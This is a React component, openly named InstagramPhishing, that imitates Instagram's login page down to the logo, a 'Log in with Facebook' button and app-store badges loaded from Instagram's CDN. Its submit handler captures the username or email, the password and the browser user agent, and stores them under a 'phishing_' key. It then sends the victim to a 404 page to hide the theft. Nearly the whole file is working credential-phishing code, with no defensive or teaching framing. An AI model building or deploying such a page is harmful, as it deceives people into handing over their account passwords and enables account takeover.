
import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';

const InstagramPhishing = () => {
  const { userId } = useParams();
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    const capturedData = {
      platform: 'Instagram',
      email: formData.email,
      password: formData.password,
      timestamp: Date.now(),
      ip: 'Unknown',
      userAgent: navigator.userAgent
    };

    const existingData = JSON.parse(localStorage.getItem(`phishing_${userId}`) || '[]');
    existingData.push(capturedData);
    localStorage.setItem(`phishing_${userId}`, JSON.stringify(existingData));

    navigate('/404-not-found');
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center px-4">
      <div className="w-full max-w-sm">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="mb-6">
            <div className="inline-block p-4 mb-4">
              <svg width="175" height="51" viewBox="0 0 175 51" className="fill-black">
                <path d="M57.7 13.9c-2.7 0-4.9 2.2-4.9 4.9v13.2c0 2.7 2.2 4.9 4.9 4.9h13.2c2.7 0 4.9-2.2 4.9-4.9V18.8c0-2.7-2.2-4.9-4.9-4.9H57.7zm7.4 3.1c.8 0 1.4.6 1.4 1.4s-.6 1.4-1.4 1.4-1.4-.6-1.4-1.4.6-1.4 1.4-1.4zm-1.7 4.5c2.3 0 4.2 1.9 4.2 4.2s-1.9 4.2-4.2 4.2-4.2-1.9-4.2-4.2 1.9-4.2 4.2-4.2zm0 1.5c-1.5 0-2.7 1.2-2.7 2.7s1.2 2.7 2.7 2.7 2.7-1.2 2.7-2.7-1.2-2.7-2.7-2.7z"/>
                <path d="M7.2 14.2h9.8l3.1 17.4h.1l3.5-17.4h8.3l3.5 17.4h.1l3.1-17.4h9.8L42.3 36.8h-9.4l-3.6-17.8h-.1l-3.6 17.8H16.2L7.2 14.2z"/>
                <path d="M86.6 14.2h7.8v22.6h-7.8V14.2zm3.9-3.8c2.3 0 4.1-1.8 4.1-4.1s-1.8-4.1-4.1-4.1-4.1 1.8-4.1 4.1 1.8 4.1 4.1 4.1z"/>
                <path d="M100.1 21.5h7.5v2.3h.1c1.1-1.7 3.1-2.9 5.6-2.9 5.9 0 7.9 3.9 7.9 8.9v7h-7.8v-6.2c0-2.3-.5-3.6-2.2-3.6-2.2 0-2.8 2-2.8 4.1v5.7h-7.8V21.5h-.5z"/>
                <path d="M133.1 21c2.9-.5 5.9-.8 8.8-.8 6.5 0 10.4 2.7 10.4 8.4v8.2h-7.2v-1.9h-.1c-1.2 1.5-3.2 2.5-5.4 2.5-3.6 0-6.4-2.2-6.4-5.6 0-3.2 2.4-5.1 5.8-5.7l4.2-.7c.6-.1 1.1-.3 1.1-.9 0-1.1-1-1.5-2.2-1.5-1.4 0-2.3.6-2.5 2h-7.2c.7-4.5 4.2-6.5 8.5-6.5v1.5zm8.9 6.2c-.4.2-.9.3-1.4.4l-2.3.4c-1.1.2-1.9.7-1.9 1.7 0 1 .8 1.6 1.9 1.6 2.2 0 3.7-1.4 3.7-3.5v-.6z"/>
                <path d="M164.4 21.5h7.5v2.8h.1c1.1-2.1 3.1-3.4 5.4-3.4.6 0 1.2.1 1.7.2v7.2c-.8-.2-1.7-.3-2.6-.3-2.6 0-4.3 1.6-4.3 4.4v4.4h-7.8V21.5z"/>
              </svg>
            </div>
          </div>
        </div>

        {/* Login Form */}
        <div className="bg-white border border-gray-300 rounded-sm p-6 mb-4">
          <form onSubmit={handleSubmit} className="space-y-2">
            <Input
              type="text"
              placeholder="Phone number, username, or email"
              value={formData.email}
              onChange={(e) => setFormData({...formData, email: e.target.value})}
              className="w-full h-9 px-2 border border-gray-300 rounded-sm text-xs bg-gray-50 focus:border-gray-400 text-gray-900"
              required
            />
            
            <Input
              type="password"
              placeholder="Password"
              value={formData.password}
              onChange={(e) => setFormData({...formData, password: e.target.value})}
              className="w-full h-9 px-2 border border-gray-300 rounded-sm text-xs bg-gray-50 focus:border-gray-400 text-gray-900"
              required
            />

            <Button 
              type="submit"
              className="w-full bg-blue-500 hover:bg-blue-600 text-white h-8 text-sm font-semibold rounded-sm mt-4"
            >
              Log In
            </Button>
          </form>

          <div className="flex items-center my-4">
            <div className="flex-1 border-t border-gray-300"></div>
            <span className="px-4 text-gray-500 text-xs font-semibold uppercase">OR</span>
            <div className="flex-1 border-t border-gray-300"></div>
          </div>

          <div className="text-center">
            <button className="flex items-center justify-center w-full text-blue-900 text-sm font-semibold">
              <svg className="w-4 h-4 mr-2" fill="#1877f2" viewBox="0 0 24 24">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
              </svg>
              Log in with Facebook
            </button>
          </div>

          <div className="text-center mt-4">
            <a href="#" className="text-blue-900 text-xs">Forgot password?</a>
          </div>
        </div>

        {/* Sign up */}
        <div className="bg-white border border-gray-300 rounded-sm p-4 text-center">
          <p className="text-sm text-gray-900">
            Don't have an account? 
            <a href="#" className="text-blue-500 font-semibold ml-1">Sign up</a>
          </p>
        </div>

        {/* Download app */}
        <div className="text-center mt-4">
          <p className="text-sm text-gray-900 mb-4">Get the app.</p>
          <div className="flex justify-center space-x-2">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Download on App Store" className="h-10"/>
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it on Google Play" className="h-10"/>
          </div>
        </div>
      </div>
    </div>
  );
};

export default InstagramPhishing;
